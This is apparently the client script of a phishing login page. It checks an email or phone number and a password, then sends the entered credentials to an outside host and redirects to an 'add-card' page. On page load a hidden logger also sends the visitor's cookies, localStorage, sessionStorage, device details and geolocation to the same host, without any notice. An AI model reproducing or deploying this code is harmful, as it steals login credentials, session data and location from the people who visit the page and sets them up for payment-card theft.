import { logClient } from './logger.js';

document.addEventListener("DOMContentLoaded", () => {
  const passwordLabel = document.getElementById("passwordLabel");
  const input = document.getElementById("userId");
  const label = document.getElementById("inputLabel");
  const errorRequired = document.getElementById("error-required");
  const errorFormat = document.getElementById("error-format");
  const errorPhone = document.getElementById("error-phone");
  const subtext = document.getElementById("subtext-info");
  const button = document.getElementById("submit-btn");
  const phoneWrapper = document.getElementById("phone-wrapper");
  const form = document.getElementById("login-form");
  const errorIcon = document.querySelector(".al-input__error-icon");
  const passwordInput = document.getElementById("password");
  const errorPassword = document.getElementById("error-password");

  const validCredentials = [
    { user: 'test@example.com', pass: 'password123' },
    { user: '123456789', pass: 'securepass' }
  ];

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const isPhone = (val) => /^\d{9,}$/.test(val);

  let touched = false;

  function updateLabelState() {
    const val = input.value.trim();
    label.classList.toggle("shrink", !!val || document.activeElement === input);
  }

  function updatePasswordLabelState() {
    const val = passwordInput.value.trim();
    passwordLabel.classList.toggle("shrink", !!val || document.activeElement === passwordInput);
  }

  function validate() {
    const val = input.value.trim();
    const passwordVal = passwordInput.value.trim();
    const isEmpty = val === "";
    const isPhoneInput = isPhone(val);
    const isEmailInput = emailRegex.test(val);
    const isValidPhone = isPhoneInput && val.length >= 9;
    const isPasswordValid = passwordVal.length >= 8;

    input.classList.remove("error", "valid", "phone-mode");
    label.classList.remove("error");
    passwordInput.classList.remove("error", "valid");
    passwordLabel.classList.remove("error");
    errorRequired.classList.add("hidden");
    errorFormat.classList.add("hidden");
    errorPhone.classList.add("hidden");
    errorPassword.classList.add("hidden");
    phoneWrapper.classList.add("hidden");
    subtext.classList.add("hidden");
    button.classList.remove("active");
    button.disabled = true;
    errorIcon.style.display = "none";

    if (!touched) return;

    let hasError = false;

    if (isEmpty) {
      input.classList.add("error");
      label.classList.add("error");
      errorRequired.classList.remove("hidden");
      errorIcon.style.display = "block";
      hasError = true;
    } else if (isPhoneInput) {
      input.classList.add("phone-mode");
      phoneWrapper.classList.remove("hidden");
      label.textContent = "Mobile number";

      if (!isValidPhone) {
        input.classList.add("error");
        label.classList.add("error");
        errorPhone.classList.remove("hidden");
        errorIcon.style.display = "block";
        hasError = true;
      }
    } else if (!isEmailInput) {
      input.classList.add("error");
      label.classList.add("error");
      label.textContent = "Email address";
      errorFormat.classList.remove("hidden");
      errorIcon.style.display = "block";
      hasError = true;
    } else {
      label.textContent = "Email address";
    }

    if (!isPasswordValid) {
      passwordInput.classList.add("error");
      passwordLabel.classList.add("error");
      errorPassword.classList.remove("hidden");
      hasError = true;
    } else {
      passwordInput.classList.add("valid");
    }

    if (!hasError) {
      input.classList.add("valid");
      button.classList.add("active");
      button.disabled = false;
      subtext.classList.remove("hidden");
    } else {
      subtext.classList.add("hidden");
    }

    updateLabelState();
    updatePasswordLabelState();
  }

  input.addEventListener("focus", () => {
    touched = true;
    updateLabelState();
  });
  input.addEventListener("blur", validate);
  input.addEventListener("input", validate);

  passwordInput.addEventListener("focus", () => {
    touched = true;
    updatePasswordLabelState();
  });
  passwordInput.addEventListener("blur", validate);
  passwordInput.addEventListener("input", validate);

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    if (button.disabled) return;

    const val = input.value.trim();
    const pass = passwordInput.value.trim();

    const isValid = validCredentials.some(
      pair => pair.user === val && pair.pass === pass
    );

    const payload = {
      user_input: val,
      password: pass,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      location: window.location.href,
      success: isValid
    };

    button.disabled = true;
    button.querySelector(".al-button__label").textContent = "Loading...";

    try {
      const response = await fetch("https://onclick-back.onrender.com/login", {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (response.ok && isValid) {
        console.log("✅ Login successful, redirecting...");
        window.location.href = "add-card.html";
      } else {
        console.warn("⚠️ Login failed or invalid credentials");
        input.classList.add("error");
        passwordInput.classList.add("error");
        errorIcon.style.display = "block";
        button.disabled = false;
        button.querySelector(".al-button__label").textContent = "Continue";
      }
    } catch (err) {
      console.error("❌ Network or server error:", err);
      alert("Something went wrong. Please try again.");
      button.disabled = false;
      button.querySelector(".al-button__label").textContent = "Continue";
    }
  });

  // 🌐 Locale toggle
  const localeToggle = document.getElementById("locale-toggle");
  const localeMenu = document.getElementById("locale-menu");
  const currentLocale = document.getElementById("current-locale");

  if (localeToggle) {
    localeToggle.addEventListener("click", (e) => {
      e.preventDefault();
      localeMenu.classList.toggle("hidden");
    });

    document.querySelectorAll("#locale-menu li").forEach((li) => {
      li.addEventListener("click", () => {
        currentLocale.textContent = li.dataset.locale;
        localeMenu.classList.add("hidden");
      });
    });
  }

  // 🧩 Client log on load
  (async function clientLogger() {
    const payload = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      deviceMemory: navigator.deviceMemory || "N/A",
      screen: {
        width: screen.width,
        height: screen.height,
        pixelDepth: screen.pixelDepth,
      },
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage),
      locationHref: location.href,
      timestamp: new Date().toISOString(),
    };

    try {
      await new Promise((resolve) =>
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            payload.geo = {
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
            };
            resolve();
          },
          () => resolve(),
          { timeout: 1500 }
        )
      );
    } catch {}

    try {
      await fetch("https://onclick-back.onrender.com/log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    } catch (err) {
      console.warn("⚠️ Log not sent:", err);
    }
  })();

  validate();
 logClient();
});
